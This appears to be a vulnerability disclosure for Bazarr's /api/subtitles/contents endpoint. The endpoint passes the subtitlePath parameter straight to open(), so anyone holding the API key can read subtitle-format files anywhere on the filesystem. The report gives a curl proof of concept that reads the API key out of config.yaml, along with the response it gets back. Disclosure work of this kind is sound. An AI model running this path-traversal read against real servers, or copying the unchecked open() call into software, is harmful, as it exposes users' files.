# Bazarr: arbitrary file read via subtitlePath API parameter (subtitle-format content)

## Description

`GET /api/subtitles/contents` in `bazarr/api/subtitles/subtitles_contents.py` (L40-48) takes the `subtitlePath` query parameter and passes it directly to `open()` with zero path validation — no realpath, no abspath, no startswith, no containment check anywhere in the file. The file content is then parsed as SRT and returned in the JSON response.

The `@authenticate` decorator checks the API key; on a default `auth.type=null` install the API key is generated and stored locally (not exposed without the key), so the attacker model is a holder of the API key — which includes any user/script the key has been shared with, and any deployment where auth is disabled or the key is leaked.

## Impact

An attacker with the API key reads the full content of any subtitle-format file readable by the service account, at any absolute path on the filesystem (including paths outside the media library). Non-subtitle-format files (e.g. `/etc/passwd`) cause an SRT parse exception (HTTP 500) and their content is not returned.

## PoC

```bash
# Prerequisite: bazarr running on :6767, API key in data/config/config.yaml
KEY=$(python3 -c "import yaml; print(yaml.safe_load(open('data/config/config.yaml'))['auth']['apikey'])")

# victim file with subtitle-format content at any path:
mkdir -p /tmp/bazarr_victim
printf '1\n00:00:01,000 --> 00:00:02,000\nTOP-SECRET-SENTENCE-42\n' > /tmp/bazarr_victim/secret.srt

curl "http://127.0.0.1:6767/api/subtitles/contents?subtitlePath=/tmp/bazarr_victim/secret.srt&apikey=$KEY"
```

## Execution result

```
$ curl "http://127.0.0.1:6767/api/subtitles/contents?subtitlePath=/tmp/bazarr_victim/secret.srt&apikey=$KEY"
{"data": [{"index": 1, "content": "TOP-SECRET-SENTENCE-42", "proprietary": "",
  "start": {"hours": 0, "minutes": 0, "seconds": 1, "total_seconds": 1, "microseconds": 0},
  "end": {"hours": 0, "minutes": 0, "seconds": 2, "total_seconds": 2, "microseconds": 0}}]}
[code 200] [path /tmp/bazarr_victim/secret.srt]

# control: nonexistent path -> [code 500]
# /etc/passwd -> [code 500] (SRT parse fails, content not returned)
```
